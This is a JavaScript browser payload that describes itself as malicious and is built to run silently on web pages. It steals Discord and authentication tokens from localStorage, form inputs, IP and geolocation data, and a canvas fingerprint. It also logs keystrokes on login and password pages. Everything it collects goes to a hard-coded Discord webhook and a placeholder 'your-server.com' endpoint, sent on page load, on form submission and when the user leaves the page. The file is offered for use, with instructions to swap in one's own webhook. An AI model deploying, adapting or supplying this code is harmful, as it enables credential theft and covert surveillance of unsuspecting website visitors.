// Malicious payload that runs silently in background
(function() {
    'use strict';
    
    // Discord webhook URL - CHANGE THIS TO YOUR WEBHOOK
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq";
    
    // Data collection object
    const collectedData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
        touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0)
    };
    
    // Get Discord data from localStorage (if user is logged into Discord in browser)
    function getDiscordData() {
        try {
            // Discord stores tokens in localStorage
            const discordTokens = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('discord') || key.includes('token') || key.includes('auth')) {
                    discordTokens[key] = localStorage.getItem(key);
                }
            }
            
            // Check for Discord API in window object
            const discordUser = window.DiscordUser || window.discordUser;
            if (discordUser) {
                return {
                    user: discordUser,
                    tokens: discordTokens,
                    found: true
                };
            }
            
            return {
                tokens: discordTokens,
                found: Object.keys(discordTokens).length > 0
            };
        } catch (e) {
            return { error: e.message, found: false };
        }
    }
    
    // Get browser fingerprint
    function getBrowserFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('FINGERPRINT', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('FINGERPRINT', 4, 17);
        
        const fingerprint = canvas.toDataURL();
        return fingerprint.substring(0, 100); // First 100 chars
    }
    
    // Get IP address using multiple methods
    async function getIPAddress() {
        const ipMethods = [
            // Method 1: WebRTC IP leak
            () => {
                return new Promise(resolve => {
                    try {
                        const rtc = new RTCPeerConnection({iceServers: []});
                        rtc.createDataChannel('');
                        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                        
                        rtc.onicecandidate = event => {
                            if (event.candidate) {
                                const candidate = event.candidate.candidate;
                                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                                const match = candidate.match(regex);
                                if (match) {
                                    resolve(match[1]);
                                    rtc.close();
                                }
                            }
                        };
                        
                        setTimeout(() => resolve(null), 1000);
                    } catch (e) {
                        resolve(null);
                    }
                });
            },
            
            // Method 2: External IP service
            async () => {
                try {
                    const services = [
                        'https://api.ipify.org?format=json',
                        'https://ipapi.co/json/',
                        'https://api.my-ip.io/ip.json'
                    ];
                    
                    for (const service of services) {
                        try {
                            const response = await fetch(service, { timeout: 3000 });
                            if (response.ok) {
                                const data = await response.json();
                                return data.ip || data.ip_address;
                            }
                        } catch (e) {
                            continue;
                        }
                    }
                } catch (e) {
                    return null;
                }
            }
        ];
        
        for (const method of ipMethods) {
            const ip = await method();
            if (ip) return ip;
        }
        
        return null;
    }
    
    // Get geolocation and ISP info
    async function getGeoData(ip) {
        if (!ip) return null;
        
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    country_code: data.country_code,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    utc_offset: data.utc_offset,
                    org: data.org,
                    asn: data.asn,
                    isp: data.org
                };
            }
        } catch (e) {
            // Fallback to ipinfo.io
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        postal: data.postal,
                        loc: data.loc,
                        org: data.org,
                        timezone: data.timezone
                    };
                }
            } catch (e2) {
                return { ip: ip, error: 'Failed to fetch geo data' };
            }
        }
        
        return null;
    }
    
    // Get form data from page
    function getFormData() {
        const forms = document.getElementsByTagName('form');
        const formData = [];
        
        for (const form of forms) {
            const inputs = form.querySelectorAll('input, textarea, select');
            const formInfo = {
                id: form.id,
                action: form.action,
                method: form.method
            };
            
            const values = {};
            inputs.forEach(input => {
                if (input.name && (input.value || input.checked)) {
                    values[input.name] = input.type === 'password' ? '***PASSWORD***' : input.value;
                }
            });
            
            if (Object.keys(values).length > 0) {
                formInfo.values = values;
                formData.push(formInfo);
            }
        }
        
        return formData;
    }
    
    // Get social media accounts from page
    function getSocialAccounts() {
        const accounts = {};
        const socialPatterns = {
            discord: /discord\.(gg|com\/invite)\/([a-zA-Z0-9\-_]+)/gi,
            instagram: /instagram\.com\/([a-zA-Z0-9\.\_]+)/gi,
            twitter: /(twitter|x)\.com\/([a-zA-Z0-9\_]+)/gi,
            youtube: /youtube\.com\/(channel\/|user\/|@)([a-zA-Z0-9\-_]+)/gi,
            tiktok: /tiktok\.com\/(@[a-zA-Z0-9\.\_]+)/gi,
            snapchat: /snapchat\.com\/add\/([a-zA-Z0-9\.\_]+)/gi,
            facebook: /facebook\.com\/([a-zA-Z0-9\.]+)/gi,
            twitch: /twitch\.tv\/([a-zA-Z0-9\_]+)/gi,
            steam: /steamcommunity\.com\/(id|profiles)\/([a-zA-Z0-9\_]+)/gi
        };
        
        // Check page content
        const pageText = document.body.innerText;
        for (const [platform, pattern] of Object.entries(socialPatterns)) {
            const matches = [...pageText.matchAll(pattern)];
            if (matches.length > 0) {
                accounts[platform] = matches.map(m => m[1] || m[2]).filter((v, i, a) => a.indexOf(v) === i);
            }
        }
        
        // Check meta tags
        const metaTags = document.querySelectorAll('meta[name*="twitter"], meta[property*="twitter"], meta[name*="og"], meta[property*="og"]');
        metaTags.forEach(tag => {
            const content = tag.getAttribute('content') || tag.getAttribute('value');
            if (content && content.includes('twitter.com')) {
                if (!accounts.twitter) accounts.twitter = [];
                accounts.twitter.push(content);
            }
        });
        
        return accounts;
    }
    
    // Send data to Discord webhook
    async function sendToDiscord(data) {
        try {
            const embed = {
                title: "📡 New Visitor Logged",
                color: 0xff3366,
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "🌐 IP & Location",
                        value: `**IP:** ${data.geo?.ip || 'Unknown'}\n**Location:** ${data.geo?.city || 'Unknown'}, ${data.geo?.country || 'Unknown'}\n**ISP:** ${data.geo?.org || 'Unknown'}`,
                        inline: true
                    },
                    {
                        name: "🖥️ Browser Info",
                        value: `**Browser:** ${data.browser.userAgent.substring(0, 50)}...\n**Platform:** ${data.browser.platform}\n**Resolution:** ${data.browser.screenResolution}`,
                        inline: true
                    },
                    {
                        name: "📝 Page Info",
                        value: `**URL:** ${data.browser.url}\n**Referrer:** ${data.browser.referrer || 'Direct'}\n**Language:** ${data.browser.language}`,
                        inline: false
                    }
                ]
            };
            
            // Add Discord data if found
            if (data.discord.found) {
                embed.fields.push({
                    name: "🎮 Discord Data Found",
                    value: `Tokens in localStorage: ${Object.keys(data.discord.tokens || {}).length}\nUser Object: ${data.discord.user ? 'Present' : 'Not found'}`,
                    inline: false
                });
            }
            
            // Add form data if found
            if (data.forms.length > 0) {
                let formText = '';
                data.forms.forEach((form, i) => {
                    formText += `**Form ${i+1}:** ${form.action || 'No action'}\n`;
                    if (form.values) {
                        Object.entries(form.values).forEach(([key, value]) => {
                            formText += `  • ${key}: ${value}\n`;
                        });
                    }
                });
                
                if (formText.length > 0) {
                    embed.fields.push({
                        name: "📋 Form Data Captured",
                        value: formText.substring(0, 1000),
                        inline: false
                    });
                }
            }
            
            // Add social accounts if found
            if (Object.keys(data.social).length > 0) {
                let socialText = '';
                Object.entries(data.social).forEach(([platform, accounts]) => {
                    socialText += `**${platform.toUpperCase()}:** ${accounts.join(', ')}\n`;
                });
                
                embed.fields.push({
                    name: "📱 Social Accounts Found",
                    value: socialText.substring(0, 1000),
                    inline: false
                });
            }
            
            // Add fingerprint
            embed.fields.push({
                name: "🆔 Browser Fingerprint",
                value: `Canvas: ${data.fingerprint.substring(0, 50)}...`,
                inline: false
            });
            
            const payload = {
                embeds: [embed],
                username: "Info Logger",
                avatar_url: "https://cdn.discordapp.com/attachments/1067246903231311872/1217164866436132944/discord-nitro-logo.png"
            };
            
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                console.error('Webhook failed:', response.status);
            }
            
        } catch (error) {
            console.error('Error sending to Discord:', error);
        }
    }
    
    // Also send raw data to secondary endpoint (optional)
    async function sendRawData(data) {
        try {
            // Create a simple endpoint (you need to set this up)
            const rawEndpoint = "https://your-server.com/log"; // CHANGE THIS
            await fetch(rawEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        } catch (e) {
            // Silently fail
        }
    }
    
    // Main execution
    async function execute() {
        try {
            // Collect all data in parallel
            const [ip, discordData, fingerprint, forms, social] = await Promise.all([
                getIPAddress(),
                getDiscordData(),
                getBrowserFingerprint(),
                getFormData(),
                getSocialAccounts()
            ]);
            
            const geoData = await getGeoData(ip);
            
            // Compile complete dataset
            const completeData = {
                browser: collectedData,
                geo: geoData,
                discord: discordData,
                fingerprint: fingerprint,
                forms: forms,
                social: social
            };
            
            // Send to Discord
            await sendToDiscord(completeData);
            
            // Send raw data
            await sendRawData(completeData);
            
            // Store in localStorage for later retrieval
            try {
                localStorage.setItem('visitor_data', JSON.stringify(completeData));
            } catch (e) {
                // Ignore storage errors
            }
            
        } catch (error) {
            console.error('Data collection error:', error);
        }
    }
    
    // Execute on page load
    window.addEventListener('load', () => {
        setTimeout(execute, 1000); // Wait 1 second for page to fully load
    });
    
    // Also execute on form submissions
    document.addEventListener('submit', (e) => {
        setTimeout(execute, 500);
    });
    
    // Execute when user leaves page
    window.addEventListener('beforeunload', () => {
        // Send quick ping with basic info
        const quickData = {
            action: 'page_exit',
            url: window.location.href,
            timeSpent: performance.now()
        };
        
        try {
            navigator.sendBeacon(WEBHOOK_URL.replace('/api/webhooks', '/api/webhooks/beacon'), JSON.stringify(quickData));
        } catch (e) {
            // Fallback to fetch
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [{
                    title: "🚪 Visitor Left Page",
                    description: `Left: ${window.location.href}`,
                    color: 0xff9900
                }]}),
                keepalive: true
            });
        }
    });
    
    // Keylogger (optional - more invasive)
    let keystrokes = '';
    document.addEventListener('keydown', (e) => {
        // Only log on specific pages (like login forms)
        if (window.location.href.includes('login') || 
            window.location.href.includes('signin') ||
            window.location.href.includes('password')) {
            
            keystrokes += e.key;
            
            // Send keystrokes every 30 seconds
            if (keystrokes.length > 50) {
                setTimeout(() => {
                    if (keystrokes) {
                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ embeds: [{
                                title: "⌨️ Keystrokes Captured",
                                description: `Page: ${window.location.href}\nKeystrokes: \`${keystrokes}\``,
                                color: 0xff0000
                            }]})
                        });
                        keystrokes = '';
                    }
                }, 30000);
            }
        }
    });
    
})();
